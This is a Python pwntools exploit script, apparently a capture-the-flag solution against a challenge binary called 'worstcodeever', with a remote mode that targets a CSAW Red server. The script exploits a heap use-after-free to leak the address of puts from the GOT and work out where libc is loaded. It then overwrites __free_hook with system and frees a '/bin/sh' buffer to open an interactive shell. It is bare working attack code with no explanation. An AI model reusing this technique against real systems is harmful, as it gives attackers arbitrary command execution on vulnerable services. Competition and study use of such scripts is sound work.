from pwn import *

e = ELF("./worstcodeever")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5008)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

def alloc(name):
  p.sendlineafter(">", "1")
  p.sendlineafter("flesh?", "1" + name)
  p.sendlineafter("age?", "3")

def alloc_i(val):
  p.sendlineafter(">", "1")
  p.sendlineafter("flesh?", "0")
  p.sendlineafter("tag?", str(val))
  p.sendlineafter("age?", "3")

def free(idx):
  p.sendlineafter(">", "2")
  p.sendlineafter("remove?", str(idx))

alloc("AAAA")
alloc("AAAA")
free(1)
alloc_i(e.got["puts"])

p.sendlineafter(">", "3")
p.sendlineafter("at?", "1")
p.recvuntil("name: ")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

free(2)
alloc_i(leak + libc.symbols["__free_hook"] - 8)
p.sendlineafter(">", "4")
p.sendlineafter("edit?", "1")
p.sendlineafter("name?", "/bin/sh\x00" + p64(leak + libc.symbols["system"]))
p.sendlineafter("age?", "3")

free(1)



debug()


p.interactive()
